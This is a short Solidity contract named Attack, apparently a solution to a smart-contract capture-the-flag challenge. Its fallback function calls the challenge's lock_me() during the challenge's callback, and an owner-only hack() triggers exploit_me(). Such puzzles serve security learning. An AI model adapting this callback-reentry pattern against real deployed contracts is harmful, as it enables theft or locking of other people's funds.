// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import {IChallenge} from './IChallenge.sol';

contract Attack is Ownable {
    IChallenge public challenge;

    constructor(IChallenge challenge_) {
        challenge = challenge_;
    }

    fallback() external {
        challenge.lock_me();
    }

    function hack(address me_) external onlyOwner {
        challenge.exploit_me(me_);
    }
}
